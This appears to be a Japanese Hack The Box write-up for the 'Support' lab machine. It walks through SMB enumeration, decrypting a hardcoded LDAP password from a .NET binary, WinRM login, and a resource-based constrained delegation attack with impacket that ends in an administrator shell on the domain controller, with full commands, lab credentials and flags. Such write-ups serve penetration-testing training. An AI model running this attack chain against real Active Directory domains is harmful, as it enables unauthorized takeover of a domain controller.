https://app.hackthebox.com/machines/Support

##  STEP 1
```sh
└─$ rustscan -a 10.129.230.181 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.230.181:53
Open 10.129.230.181:88
Open 10.129.230.181:135
Open 10.129.230.181:139
Open 10.129.230.181:389
Open 10.129.230.181:445
Open 10.129.230.181:464
Open 10.129.230.181:593
Open 10.129.230.181:636
Open 10.129.230.181:3268
Open 10.129.230.181:3269
Open 10.129.230.181:5985
Open 10.129.230.181:9389
Open 10.129.230.181:49664
Open 10.129.230.181:49667
Open 10.129.230.181:49678
Open 10.129.230.181:49683
Open 10.129.230.181:49707
10.129.230.181 -> [53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49678,49683,49707]
```


## STEP 2
guestでsmb列挙  
support-toolsにread権限を確認
```sh
└─$ netexec smb 10.129.230.181 -u ' ' -p '' --shares
SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False) 
SMB         10.129.230.181  445    DC               [+] support.htb\ : (Guest)
SMB         10.129.230.181  445    DC               [*] Enumerated shares
SMB         10.129.230.181  445    DC               Share           Permissions     Remark
SMB         10.129.230.181  445    DC               -----           -----------     ------
SMB         10.129.230.181  445    DC               ADMIN$                          Remote Admin
SMB         10.129.230.181  445    DC               C$                              Default share
SMB         10.129.230.181  445    DC               IPC$            READ            Remote IPC
SMB         10.129.230.181  445    DC               NETLOGON                        Logon server share 
SMB         10.129.230.181  445    DC               support-tools   READ            support staff tools
SMB         10.129.230.181  445    DC               SYSVOL                          Logon server share 
```
フォルダ内にファイルを複数確認したが、一般的なファイル名ではないuserinfo.exeを発見・ダウンロード
```sh
└─$ smbclient -N -c 'ls' //10.129.230.181/support-tools
  .                                   D        0  Wed Jul 20 13:01:06 2022
  ..                                  D        0  Sat May 28 07:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022

                4026367 blocks of size 4096. 969133 blocks available

└─$ smbget -N 'smb://10.129.230.181/support-tools/UserInfo.exe.zip'
Using domain: WORKGROUP, user: kali
smb://10.129.230.181/support-tools/UserInfo.exe.zip
Downloaded 271.00kB in 10 seconds
```
zipを展開すると、exeやdllが確認された  
userinfo.exeのファイル種別を確認すると、.net製であることを確認
```sh
└─$ unzip UserInfo.exe.zip 
Archive:  UserInfo.exe.zip
  inflating: UserInfo.exe            
  inflating: CommandLineParser.dll   
  inflating: Microsoft.Bcl.AsyncInterfaces.dll  
  inflating: Microsoft.Extensions.DependencyInjection.Abstractions.dll  
  inflating: Microsoft.Extensions.DependencyInjection.dll  
  inflating: Microsoft.Extensions.Logging.Abstractions.dll  
  inflating: System.Buffers.dll      
  inflating: System.Memory.dll       
  inflating: System.Numerics.Vectors.dll  
  inflating: System.Runtime.CompilerServices.Unsafe.dll  
  inflating: System.Threading.Tasks.Extensions.dll  
  inflating: UserInfo.exe.config

└─$ file UserInfo.exe   
UserInfo.exe: PE32 executable for MS Windows 6.00 (console), Intel i386 Mono/.Net assembly, 3 sections
```
ilspyでデコンパイル  
ユーザ名ldapでldapクエリを実行しているコードを確認  
ユーザ名ldapのパスワードは、protectedクラスから取得されているっぽい  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Support_01.png">  
protectedクラスを確認、暗号化パスワードの復号化処理を確認  
base64デコード後、xor暗号を２回実行している
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Support_02.png">  
復号化するためにc#コードをpowershellに実装し実行  
結果、`nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`を取得
```powershell
$enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
$key = [System.Text.Encoding]::ASCII.GetBytes("armando")

$array = [System.Convert]::FromBase64String($enc_password)
$array2 = New-Object byte[] ($array.Length)

for ($i = 0; $i -lt $array.Length; $i++) {
    $array2[$i] = $array[$i] -bxor $key[$i % $key.Length] -bxor 0xDF
}

$decoded = [System.Text.Encoding]::UTF8.GetString($array2)
Write-Output $decoded
```
ということでユーザ名ldapでログイン成功  
5985番がオープンだったためwinrmログイン可能だが、ldapではwinrmログインできないことを確認
```sh
└─$ netexec ldap 10.129.230.181 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --groups 'Remote Management Users'
LDAP        10.129.230.181  389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)
LDAP        10.129.230.181  389    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 
LDAP        10.129.230.181  389    DC               support
```


## STEP 3
ldap情報を見ていると、supportに謎の属性を確認  
属性infoの値はもしかしたらパスワードかも  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Support_03.png">  
なんとwinrmでログイン成功、ユーザフラグゲット
```powershell
└─$ evil-winrm -i 10.129.230.181 -u support -p Ironside47pleasure40Watchful               
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\support\Documents> cat ../desktop/user.txt
de1410b52df88029f1c9eddfac76d8a2
```


## STEP 4
bloodhoundを実行  
supportが所属するグループは、ドメコンのマシンアカウントに対してgenericall権限を有することを確認  
bloodhound上で、この権限を使用してrbcd攻撃が可能であることを確認
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Support_04.png">  
ドメインユーザでも作成可能である、マシンアカウントを作成
```sh
└─$ impacket-addcomputer -computer-name 'kali$' -computer-pass 'Ironside47pleasure40Watchful' -dc-ip 10.129.230.181 'support.htb/support:Ironside47pleasure40Watchful'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account kali$ with password Ironside47pleasure40Watchful.
```
ターゲットのマシンアカウントの`msDS-AllowedToActOnBehalfOfOtherIdentity`属性に作成したマシンアカウントを追加
```sh
┌──(kali㉿kali)-[~/htb/ldap]
└─$ impacket-rbcd -delegate-to 'dc$' -delegate-from 'kali$' -action 'write' -ts -dc-ip 10.129.230.181 'support.htb/support:Ironside47pleasure40Watchful'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-11-07 07:26:16] [*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[2025-11-07 07:26:17] [*] Delegation rights modified successfully!
[2025-11-07 07:26:17] [*] kali$ can now impersonate users on dc$ via S4U2Proxy
[2025-11-07 07:26:17] [*] Accounts allowed to act on behalf of other identity:
[2025-11-07 07:26:17] [*]     kali$        (S-1-5-21-1677581083-3380853377-188903654-6101)

└─$ impacket-rbcd -delegate-to 'dc$' -action 'read' -ts -dc-ip 10.129.230.181 'support.htb/support:Ironside47pleasure40Watchful' 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-11-07 07:26:58] [*] Accounts allowed to act on behalf of other identity:
[2025-11-07 07:26:58] [*]     kali$        (S-1-5-21-1677581083-3380853377-188903654-6101)
```
```sh
└─$ impacket-getST -spn 'cifs/dc.support.htb' -impersonate administrator -ts -dc-ip 10.129.230.181 'support/kali$:Ironside47pleasure40Watchful'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-11-07 07:52:02] [-] CCache file is not found. Skipping...
[2025-11-07 07:52:02] [*] Getting TGT for user
[2025-11-07 07:52:04] [*] Impersonating administrator
[2025-11-07 07:52:04] [*] Requesting S4U2self
[2025-11-07 07:52:06] [*] Requesting S4U2Proxy
[2025-11-07 07:52:07] [*] Saving ticket in administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache

└─$ impacket-describeTicket administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache                                   
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Number of credentials in cache: 1
[*] Parsing credential[0]:
[*] Ticket Session Key            : 15f9e24aa0e3a0a42dfb85bcec0f5070
[*] User Name                     : administrator
[*] User Realm                    : support
[*] Service Name                  : cifs/dc.support.htb
[*] Service Realm                 : SUPPORT.HTB
[*] Start Time                    : 07/11/2025 07:52:08 AM
[*] End Time                      : 07/11/2025 17:52:04 PM
[*] RenewTill                     : 08/11/2025 07:52:03 AM
[*] Flags                         : (0x40a50000) forwardable, renewable, pre_authent, ok_as_delegate, enc_pa_rep
[*] KeyType                       : rc4_hmac
[*] Base64(key)                   : FfniSqDjoKQt+4W87A9QcA==
[*] Kerberoast hash               : $krb5tgs$18$USER$SUPPORT.HTB$*cifs/dc.support.htb*$a4d5cb95dc4ea10bbbcc9ce8$1da6ea3b0925f5a231b0596e4212482e412ede081d1606902fffa0b029a0ab9bf40e0d7d8d8f007ce604fa0ec4e2005edbbdebea0acb35fa7552608f98fbf0906dc169bccef99ff2ba1500333b12305d7fed4edf40872c594244f28473e6ba6fc4736c8e4fdfa721a89babf1ffee0caefcb6b97185f96b0f31542731d5d8994de2e2f35060b9cd54af5f3dde402c6d74f5497d0086b9b10000004e8399717e00cd20d5be09c0c5cb9690c30b191a3c7c85a8205e0f31295328f591f4d1f55cd9f1106c9dcc7dc825098781061b77448dff2c99f2f28aa05afaccbf1e930694919e107536b02e73ce7a5f2e35faac2122ee86589cc9188475465f1def584f9a50b7daa8ef588b900e89f58ed126892afe311c8025f205776a1c9ad1e182809ebbc792810561ea27a816abaf1aa5fdab5c34c69233e6675c756fce12907afd85c5284d669f1c5629f9935dc03343b182d669da7e823b240b3148cd4ae1923189d46d5dcf25a7afbecf88e72c8493e0335647bdcbfefe6370ad5b76d7f3b0f48d9ab64c9f433975596f6797e0515f56e867f216dd9e38cabb761c16e7efa7eded7db90a0b6c60a401d78e5bc5022740be0ac2b696586333b546e086fac4ad9b8b0a6575b2104d7d5bf84097858fc6230942c5f8d2de9e8894bdac738507c3af27113d8d88c2d77adeb192eac5b962a27fccf24f8b5df0f83857d9f8763fe974a754e1075222f61ae3b3e8917a4ff2cc539758eef6ff4c57f3acc37e7141a1d4d42a5acf4ec9c325c8d94c9343f1f1a2aaaa894fbaec24f0c449b4c2b6a0b6eb7956c341ba17daf1ca2c5e0243d523872ef0c827f63d4223b64d4ef4cf1407cfd6a207f91faeedfd9f664dc8c8eab938d774fe79f362643bd0f3b6e90bcabe98150315a0a7bc44d0e323184616d49892c72358e5e21d0d6d61864f7b7e509619a624e2d4fbc31f060d0de45163144eb6a3a8156c35bba9d1e67ff9c880466e56bb234a6295ec4739f8f4eca7fe187bdc288490547bedddae2c3de0c71545e5f597ba418cc7705c7f0074b4267e183070d69272b193efc00d8494233091a1fe063591cb6e88cf6088d905e6349404b4ac58f0dc18760084c5857b47cfad1d0aa1021384cc44f4283a5a8f2c43f2e6324c8ad5669d347ccdfbe4454b9abb0d89c4915a3f018165088b1de5941e5e91578617ae058453826fff166d32559a2371ab60714cce9f5247d62858e3141c72a521dcc1275750ef40be51adb07f21bf0c5671a41b32d8a0c721cae65d644d2aa7d93d6f3ef26278c52342cde751da3fe08f9573abe8404f00b906c5857ef6cd721829331b3188c55612f5ded4bc9b1c9bafec29955674ec42d5bc7fb0b518c898363e9bbc476767de7bbdac0a241a0611884dc494bc71e9e9d66c03ee6aa1986b9b03054fd4e565d764d62f9aff5d28c33db48f42fb3a6be87fac500cb9424c60baf09568ba5140f42c67e6352bd9f9c9446d922b862121ed3af768f741889d96626c30687bdf6013d9e6f4fe2cb2c2a53c6a9acf4d3d0fb9dab03cdaff2c1d68cea3ed111b045925361e03efd72ea432c669aaa8498c2f14946cf3642a7b2c4cf3a7963f507c17a926a496c0c65d8a2344f3a3f375b5823104e210fd077c74189bbe192ce40bbd842cc1d0044bd2843aa5863510c41726bdba975b7819dc8b2e07151742336c050e1cab5dc5142dd361659572ed9e240c107debf51e6ca4a9ab149e3c0425632d8539abab529c40d839b31eb6e05382af0422d267f464cff9b2aad88ad160286e7f6aac96db3350bee4d77154d3072cc8cf
[*] Decoding unencrypted data in credential[0]['ticket']:
[*]   Service Name                : cifs/dc.support.htb
[*]   Service Realm               : SUPPORT.HTB
[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
```
```sh
└─$ export KRB5CCNAME=administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache

└─$ impacket-psexec -k -target-ip 10.129.230.181 'dc.support.htb'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.230.181.....
[*] Found writable share ADMIN$
[*] Uploading file CpcORACz.exe
[*] Opening SVCManager on 10.129.230.181.....
[*] Creating service cxzd on 10.129.230.181.....
[*] Starting service cxzd.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> type c:\users\administrator\desktop\root.txt
f006b3f9a0397b6fed86ed2e083026d1
```
